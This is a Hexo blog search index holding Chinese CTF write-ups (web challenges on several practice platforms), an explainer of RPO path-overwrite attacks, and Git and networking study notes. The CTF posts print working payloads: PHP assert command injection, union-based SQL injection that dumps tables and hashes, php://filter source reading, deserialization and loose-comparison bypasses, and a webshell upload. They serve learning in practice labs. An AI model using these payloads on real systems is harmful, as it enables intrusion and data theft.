<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ctf论剑场]]></title>
    <url>%2F2019%2F08%2F28%2Fctf%E8%AE%BA%E5%89%91%E5%9C%BA%2F</url>
    <content type="text"><![CDATA[头像一开始是先去查了RGB通道，没有发现，后来直接在WSL下用strings然后grep关键字flag就得到了flag，但是提交一直失败，后面才发现得到的flag是先用base64加密过的，要解密然后再用md5，提交成功 0和1的故事文件压缩了三次，分别是tar.gz,rar,zip,一开始直接用strings发现了以下结果 当时就一直以为是zip文件里面藏了一个文件，一直在想办法修复，全然忘记题目提示，后来经同学提醒，发现解压出来的txt文件里面有tab和空格，联想题目空格和0很配，将空格替换成0，tab替换成1，得到一串二进制数字，然后我就在这里卡了很久，最后群里有做过的大佬跟我讲我才知道转化成十六进制就是flag的内容了，但是说实话这flag我看着啥也不像，唉 web1 extract，很明显的变量覆盖，令a等于空，然后给b传一个不存在的文件，就得到flag了 web2 脚本题，刚好昨天接触了点正则表达式，借python的re库来试试，脚本如下 123456789import requestsimport reurl = "http://xxx.xxx.xxx.xxx:10002/"start = requests.session()r = start.get(url)fun = re.sub(r'([^0-9\+\-\*\(\)])',"",r.text)result = eval(fun)flag = start.post(url,data=&#123;'result':str(eval(fun))&#125;)print(flag.text) 直接得到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CTF论剑场</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅析RPO漏洞攻击原理]]></title>
    <url>%2F2019%2F08%2F26%2F%E4%BB%8E%E4%B8%80%E9%81%93web%E9%A2%98%E7%9B%AE%E7%9C%8BRPO%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[RPO的全称为Relative Path Overwrite,也就是相对路径覆盖，利用客户端和服务端的差异，通过相对路径来引入我们想要的js或者css文件，从而实现某种攻击。 就目前来看此攻击方法依赖于浏览器和网络服务器的反应，基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异，利用前端代码中加载的css/js的相对路径来加载其他文件，最终浏览器将服务器返回的不是css/js的文件当做css/js来解析，从而导致XSS，信息泄露等漏洞产生。 利用条件 ①Apache 配置错误导致AllowEncodedSlashes这个选项开启（对Apache来说默认情况下 AllowEncodedSlashes 这个选项是关闭的），或者nginx服务器。 ②存在相对路径的js或者css的引用 这里使用WSL+apache2/nginx+php进行测试 第一个条件当我们访问http://127.0.0.1/RPO%2findex.php时，不同服务器有如下表现Nginxnginx服务器可以正常访问 Apache2apache2默认配置无法访问 第二个条件存在相对路径的引用，如下 结合条件产生RPO漏洞简单复现现在情况是这样的，我们在RPO目录下有这样的一个index.php文件 123456&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script src="test.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 以及一个test.js文件如下 1alert("this is under RPO"); 同时RPO文件夹下还有一个文件夹xxx,该文件夹下存在test.js如下 1alert("this is under xxx"); 当我们访问http://127.0.0.1/RPO/index.php时，自然而然弹出了RPO文件夹下的test.js 而我们访问http://127.0.0.1/RPO/xxx/index.php,很显然xxx文件夹下是没有index.php这个文件的 但是当我们访问http://127.0.0.1/RPO/xxx/..%2findex.php时却出现了 RPO文件夹下的index.php竟然读取了xxx文件夹下的test.js！！！ 攻击过程 我们向服务器请求URL：http://127.0.0.1/RPO/xxx/..%2findex.php 服务器见多识广，看到的是：http://127.0.0.1/RPO/xxx/../index.php也就是返回了http://127.0.0.1/RPO/index.php 浏览器比较呆萌，看到的是:http://127.0.0.1/RPO/xxx/..%2findex.php这里浏览器认为..%2findex.php是一个文件，并且执行了这个文件里面的&lt;script&gt;,想要读取当前同目录下的test.js。而浏览器认为的路径是http://127.0.0.1/RPO/xxx/,因此我们成功读取到了xxx文件夹下test.js并当作js解析。 RPO的任意文件读取除了跨目录读取js，RPO漏洞还可以实现任意文件读取，前提是网站必须支持URL重写。 什么是url重写呢，URL重写就是首先获得一个进入的URL请求然后把它重新写成网站可以处理的另一个URL的过程。举个例子：（这里没有成功复现出来，就暂时先用别人的图来讲了，侵删，，我太菜了） 这里的index.php代码如下： 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;RPO attack test&lt;/head&gt; &lt;body&gt; &lt;script src="3.js"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(E_ALL^E_NOTICE^E_WARNING);if($_GET['page'])&#123; $a=$_GET['page']; Header('Location:http://localhost/RPO/test/'."$a".'.html');&#125;?&gt; 这里其实还开启了pathinfo模式，url中的/page/3相当于?page=3,然后通过Header转到新的url。这样看起来url会更加和谐，但是问题也出在这里。 当我们请求http://localhost/RPO/index.php/page%2f..%2f..%2findex.php时，浏览器想要加载同目录下的3.js:http://localhost/RPO/index.php/3.js，在浏览器眼里这就等同于http://localhost/RPO/index.php，这就把index.php当作js处理了，然后我们就可以f12直接查看资源获得index.php的源码了，css文件的包容性比较好，可以读取更多类型的文件 参考链接：https://www.freebuf.com/articles/web/166731.html]]></content>
      <categories>
        <category>CTF</category>
        <category>RPO漏洞</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RPO漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git学习笔记]]></title>
    <url>%2F2019%2F08%2F25%2FGit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Git命令图解 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 创建版本库在当前目录新建一个Git代码库git init 新建一个目录，将其初始化为Git代码库git init [project-name] 下载一个项目和它的整个代码历史git clone [url] 配置显示当前Git配置git config --lits 编辑Git配置文件git config -e --gloal 设置提交代码时的用户信息12git config --global user.email "youremail@example.com"git config --global user.name "yourName" 增加删除文件到暂存区所有的的版本控制系统只能追踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等。版本控制系统可以告诉你每次的改动，比如在第五行加了一个单词”Linux”,在第八行删除了”Windows”等等。而图片，视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就只知道图片从100k改成了120k。 其中Microsoft的Word格式是二进制格式，因此控制版本系统无法跟踪Word文档的改动。 添加指定文件到暂存区git add [file1] [file2] 添加指定目录到暂存区，包括子目录git add [dir] 添加当前目录所有文件到暂存区git add . 对于同一个文件的多次变化，逐次确认提交git add -p 删除工作区文件，并将这次删除放入暂存区git rm [file1] [file2] 改名文件，并且将这个改名放入暂存区git mv [file-original] [file-renamed] 管理撤销修改丢弃工作区修改git checkout -- [file] 删除添加到暂存区中的某个文件git reset HEAD [file] 查看工作区和版本库里最新版本的区别git diff HEAD -- [file] 12345678910$ git diff HEAD -- README.txtdiff --git a/README.txt b/README.txtindex ab76794..0f8a8e9 100644--- a/README.txt+++ b/README.txt@@ -1,3 +1,4 @@ this is an test test enter test again+test diff 提交代码提交暂存区到仓库区git commit -m &quot;message&quot; 提交暂存区指定文件git commit [file1] [file2] -m &quot;message&quot; 提交工作区自上次commit后的所有变化到仓库git commit -a 提交时显示所有diff信息git commit -v 使用一次新的commit替代上一层commit提交信息git commit --amend -m &quot;message&quot; 重做上一次commit，并包括指定文件的新变化git commit --amend [file1] [file2] 时光机穿梭查看git loggit log如下： 1234567891011121314151617commit 03d99a41e6df6d5c9f178469d2486d3f18b31676Author: rasang &lt;test@qq.com&gt;Date: Sun Aug 25 17:52:59 2019 +0800 test3commit b099664a069db05bbde874fc5bae325183885104Author: rasang &lt;test@qq.com&gt;Date: Sun Aug 25 17:50:10 2019 +0800 test2commit 01197a271ada3f03b80493446a6353e410f9a621Author: rasang &lt;test@qq.com&gt;Date: Sun Aug 25 17:48:23 2019 +0800 test1 commit后面跟着的就是commit-id，使用如下命令回退版本git reset --hard [commit-id]也可以使用如下命令返回上一个版本git reset HEAD^而HEAD^^则是上上个版本，回退前100个版本的指令为git reset HEAD~100回退版本后，晚于该版本的log会消失，想要回到原来的版本，需要使用git reflog查看穿梭的记录 1234567891011$ git reflog03d99a4 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to HEAD^4e75dd6 HEAD@&#123;1&#125;: commit: upper03d99a4 (HEAD -&gt; master) HEAD@&#123;2&#125;: reset: moving to 03d99a41e6df6df136f4 HEAD@&#123;3&#125;: reset: moving to df136fdf136f4 HEAD@&#123;4&#125;: reset: moving to df136f499b87ac6d6b2df136f4 HEAD@&#123;5&#125;: commit: delete113dcfe HEAD@&#123;6&#125;: commit: test403d99a4 (HEAD -&gt; master) HEAD@&#123;7&#125;: commit: test3b099664 HEAD@&#123;8&#125;: commit: test201197a2 HEAD@&#123;9&#125;: commit (initial): test1 远程仓库添加SSH key。如果之前没有创建过，可输入：ssh-keygen -t rsa -C &quot;youremail@example.com&quot;一路回车，可在用户主目录下生成.ssh目录，其中id_rsa为私钥，id_rsa.pub是公钥。然后就可以进入代码托管平台将公钥里的内容添加到账号的公钥里面了 添加远程仓库在代码托管平台上新建一个仓库，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库。关联远程仓库：git remote add origin [git_add]关联后使用git push -u origin master第一次推送master分支所有内容，此后则用git push origin master推送最新更新 从远程库克隆首先要知道仓库地址，一般都是在代码页就有了，然后使用指令git clone [git_add]就好了 分支管理创建与合并分支创建并切换分支git branch -p [brach_name] 查看当前分支git branch 当前分支前面会标一个*号 切换分支git checkout [branch_name] 分支合并git merge dev将dev分支合并到当前分支 删除分支git branch -d dev 查看分支合并图git log --graph]]></content>
      <categories>
        <category>课程</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络复习]]></title>
    <url>%2F2019%2F06%2F15%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E8%84%91%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[水了一学期的计算机网络也该开始复习了，先把网络层和运输层复习了吧，其他后面再复习 网络层 运输层 数据链路层 下面是一些别人整理得比较好的脑图 互联网协议 TCP与HTTP]]></content>
      <categories>
        <category>课程</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>脑图</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防世界部分web wp]]></title>
    <url>%2F2019%2F04%2F26%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86web-wp%2F</url>
    <content type="text"><![CDATA[参加强网杯的时候无意中看见这一个平台，想着也可以拿来练一下手，感觉还不错 Training-Get-Resourced签到题，右键查看源代码得到flag Training-WWW-Robots看题目，就应该是知道要查看robots.txt文件，发现有个/fl0g.php，得到flag NaNNaNNaNNaN-Batman下载附件，看了一下应该是js代码，用浏览器打开 查看元素只发现了这个 经队友提示在浏览器里面断点调试就可以恢复的代码 后来发现直接把web100里面的eval改成alert也可以直接得到代码 所以输入 be0f233ac7be98aa 就可以得到flag ics-06很奇怪的一道题，一开始进去是一个html首页，什么也点不了 后来用dirsearch扫了一遍网站发现还有个index.php，进去后发现一个报表中心，发现get传参id，但是也不能注入 后来看wp去了，要求是传参id=2333，？？？？这又是什么脑洞 lottery查看robots.txt发现存在/.git 泄露，可以使用GitHack工具获取源码 漏洞存在api.php里面 1234567891011121314function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION['money']; $numbers = $req['numbers']; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; &#125; 其中numbers是用户购买的彩票号数，这里没有采用===而是使用==，存在php弱松散型比较,且从上面定义的函数看来win_number应该是一个字符串，只要利用弱松散类型转化为布尔类型就可以绕过这一验证 修改POST参数得到flag 1&#123;"action":"buy","numbers":['true','true','true','true','true','true','true']&#125; 下面附上php的松散型比较表格 TRUE FALSE 1 0 -1 “1” TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE FALSE TRUE FALSE TRUE FALSE FALSE “0” “-1” NULL array() “php” “” TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE upload上传漏洞，发现选择完php文件后立马就提示格式错误，判断是js本地判断，修改一句话木马为1.jpg，burp抓包改为1.php即可上传成功，也可以直接右键检查元素修改check()函数，同样也可以绕过，然后菜刀连接，成功拿到shell。 一开始打开flag文件发现什么都没有，后来试了另一个菜刀，发现是工具问题，遂解决 mfw习惯性用dirsearch扫了一遍，发现git泄露 index.php存在如下代码 123456789101112131415if (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125;else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!"); 这注释看着就有问题，发现assert函数，这个函数存在代码执行漏洞，strpos使用不当也会造成弱松散型漏洞，但是这里用的是===，所以没有这个问题。主要还是对assert进行攻击。尝试一下闭合语句。 payload如下 1/?page=123','..') === false and system('cat templates/flag.php') and strpos(' 发现什么也没有。。。后来用burp抓包在返回包发现了flag php2该网站存在敏感文件index.phps，可查看index.php的源码，查看发现如下代码 123456789101112131415&lt;?phpif("admin"===$_GET[id]) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "admin")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;Key: xxxxxxx &lt;/p&gt;";&#125;?&gt;Can you anthenticate to this website? 对admin进行二次编码，这样第一次接收到的id是admin进行一次编码得到的数据，再经过解码就可以得到admin unserialize3打开页面发现如下 123456class xctf&#123; public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= 结合题目可知是反序列漏洞，之前也一直没有去接触这种类型的漏洞，也没有接触过类，正好学习一下 这个题目考察的是__wakeup的漏洞，只要让传入的序列有问题，就不会继续进入执行exit了，得到flag，payload如下,只要报错就要可以了，有多种答案 1?code=O:4:"xctf":2:&#123;s:4:"flag";s:3:"111";&#125; 一开始对序列化后的格式一直看不懂，后来找到了这篇博客,讲的很详细 FlatScience老规矩dirsearch跑一遍，结果发现了login.php，找了一边发现login源码有提示 1&lt;!-- TODO: Remove ?debug-Parameter! --&gt; 后来查了一下发现传参debug可以获得login源码 123456789101112131415161718192021222324252627&lt;?php if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo "&lt;br&gt;Some Error occourred!"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header("Location: /"); die(); &#125; &#125; if(isset($_GET['debug'])) highlight_file('login.php'); ?&gt; &lt;!-- TODO: Remove ?debug-Parameter! --&gt; 简单看了一下，发现直接带入数据库查询了，没有进行过滤，如果查询到的话会以cookie形式返回查询结果，经测试发现第二位存在注入点，但是没有database()，查了才知道sqlite自带的结构表是sqlist_master,考虑如下paylaod 1usr=' union select name,sql from sqlite_master--+&amp;pw= sql是sqlite_master中的一个字段你，保存的是建表时的语句既然返回的是第二位，那就令第一位为name，第二位为sql，这样就可以得到以下结果 1CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255)) 这样就知道有个Users表中有四个字段了，利用limit偏移查询 1234usr=' union select name,id from Users limit 0,1--+&amp;pw=usr=' union select name,name from Users limit 0,1--+&amp;pw=usr=' union select name,password from Users limit 0,1--+&amp;pw=usr=' union select name,hint from Users limit 0,1--+&amp;pw= 得到 id name password hint 1 admin 3fab54a50e770d830c0416df817567662a9dc85c my+fav+word+in+my+fav+paper%3F%21 2 fritze 54eae8935c90f467427f05e4ece82cf569f89507 my+love+is%E2%80%A6%3 3 hansi 34b0bb7c304949f9ff2fc101eef0f048be10d3bd the+password+is+password 所以这里就是要去他的论文里查找一个单词加上Salz!后加密等于上表哈希值的单词了，先贴个大佬的代码 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlibdef get_pdf(): return [i for i in os.listdir("./") if i.endswith("pdf")]def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return textdef find_password(): pdf_path = get_pdf() for i in pdf_path: print "Searching word in " + i pdf_text = convert_pdf_2_text(i).split(" ") for word in pdf_text: sha1_password = hashlib.sha1(word+"Salz!").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print "Find the password :" + word exit()if __name__ == "__main__": find_password() 得到密码后登陆得到flag NewsCenter打开后发现有地方可以注入，测试发现有三个点，其中有两个是可以注入得 先爆数据库名 发现没办法用select schema_name from information_schema.schemata爆数据库名，只好看看现在这个数据库的表 1hello' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 # 得到news,secret_table,看起来flag多半在secret_table这个表里了，接下来爆列名 1hello' union select 1,(select group_concat(column_name) from information_schema.columns where table_name="secret_table"),3 # 得到id,fl4g,继续爆数据 flag有了 upload这题看上去是一道上传题，但是实际上确实一道二次注入的题，上传一个普通文件会发现文件名会回显在页面上，因此可以对这个进行尝试 尝试了#，–+都不能有回显的数据，再尝试对输入进行闭合 1'+(select 1)+' 发现select被过滤了，测试了一下from也被过滤了，除此之外还会检测一些敏感函数例如ascii和mid，但是conv，hex，substr还在。还有就是当 后来经过尝试发现select只过滤了一次，而名字太长转换成数字会表现为科学记数法方式,所以可以构造以下payload 爆数据库名1'+conv(hex(substr((sselectelect database()),9,4)),16,10)+'.jpg 爆表名1'+conv(hex(substr((sselectelect table_name frfromom information_schema.tables where table_schema=database() limit 0,1),1,4)),16,10)+'.jpg 得到两个表files和hello_flag_is_here 爆字段1'+conv(hex(substr((sselectelect column_name frfromom information_schema.columns where table_name='hello_flag_is_here' limit 0,1),1,4)),16,10)+'.jpg 得到一个字段 i_am_flag 爆内容1'+conv(hex(substr((sselectelect i_am_flag frfromom hello_flag_is_here limit 0,1),1,4)),16,10)+'.jpg 得到flag PS： 由于之前完全没有深入接触过sql，所以在这一道题上面花费了很多时间，可以说就是一个学习sql的过程，也遇到很多坑，比如嵌套select语句的时候必须将里面的sql语句用()括起来，还有就是字符串相加会等于0，所以在上面的这道题目中才需要使用hex函数将字符串转化为十六进制数，而十六进制数在这里也是字符串，在select语句里面只有前缀为0x才会认定为十六进制数，否则字符串加起来都是0，所以必须的用conv函数将得到的十六进制数转化为10进制，再将其传达出来。此外还遇到一个有意思的事情，就是如果字符串是数字开头，那么字符串和数字进行运算的值就是开头的数字。]]></content>
      <categories>
        <category>CTF</category>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MOCTF-WriteUp]]></title>
    <url>%2F2018%2F11%2F28%2FMOCTF-WriteUp%2F</url>
    <content type="text"><![CDATA[初次玩CTF，听说自己学校有平台，就来玩一下 一道水题题如其名，查看源代码就可以看到flag 还是水题 尝试输入，发现输入失败，于是F12直接修改数据 直接删除disabled，修改长度为5 访问限制 很简单，使用tamper data修改firefox为NAIVE就可访问flag 机器蛇 直接进入源代码，发现下面有个提示，进入robots.txt文件查看 访问flagxxxxxxxxxxxxxx.php的那个页面即可获得flag php黑魔法题目提示php，访问index.php 发现源代码 考察的是弱类型，md5无法加密数组，都返回false，因此构造?a=[]=1&amp;b[]=2，得到flag 我想要钱 阅读源代码可知要输入一个money，使其长度小于4，又要大于时间数（非常大），还不能是数组，于是就想到用科学计数法输入5e10，得到flag 登陆就对了 题目提示是一道sql注入题目，输入万能密码 ‘or ‘1’ = ‘1’ # 文件包含右键查看源代码发现提示说有flag.php，于是想着直接输入以下url访问 1http://119.23.73.3:5001/web8/index.php?file=flag.php 但是发现什么也没有，百思不得其解，后来看了大佬的wp才知道要用 php://filter函数 才能把文件经过base64解密传回来，还是经历的太少了,附上参数表 于是乎构造payload： 1?file=php://filter/convert.base64-encode/resource=flag.php 回显一段base64加密的字符串，解密就可以看到被 // 注释掉的flag 暴跳老板拿到题目一时懵逼，不知道怎么处理，后来用burp在返回包里发现了这个 于是乎通过post传 1postText=&amp;Dear=MyBoss 得到flag flag在哪？点击页面上的getflag后直接跳转到there is no flag，怀疑是302跳转于是抓包果不其然,发现五个页面 12345where_is_flag.phpflag.phpI_have_a_frog.phpI_have_a_flag.phpno_flag.php 找了好几遍还是没有找到，当时做的时候也没有提示，无奈之下只好找wp发现原来题目有两个hint Hint1: 跟一首歌有关。 Hint2: PPAP 访问抓包flagfrog.php，得到flag 美味的饼干先任意用户登陆一下查看cookie发现这个 1ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D %3D应该是=了，怀疑是base64加密，解密了一下得到 1ee11cbb19052e40b07aac0ca060c23ee 一开始以为是字符串转16进制，后来发现不对，应该是md5加密，解密后得到”user” 根据提示admin才能得到flag，对”admin”进行同样的加密，替换cookie，查看源码得到flag 没时间解释了发现标题只有index2.php，试了index1.php不行，应该是index.php了，结果index.php被跳转了 抓包发现还有个 uploadsomething.php ，上传一句话结果发现被转换成Too slow! 用burp的Intruder同时请求,得到flag 另外不知道为什么在sublime上用python跑不出来，可能是我还不太会用 火眼金睛看题目的意思应该就是数出moctf的数量然后post传参，放上脚本 12345678import requestsurl = 'http://119.23.73.3:5001/web10/'s=requests.Session()res=s.get(url)num = res.text.count("moctf")-1 #因为题目里还有一个moctf所以要减一url = 'http://119.23.73.3:5001/web10/work.php'print(s.post(url,data=&#123;"answer":num&#125;).text) 这里好像要用session才能让答案被识别，否则会一直显示答案错误]]></content>
      <categories>
        <category>CTF</category>
        <category>MOCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>MOCTF</tag>
      </tags>
  </entry>
</search>
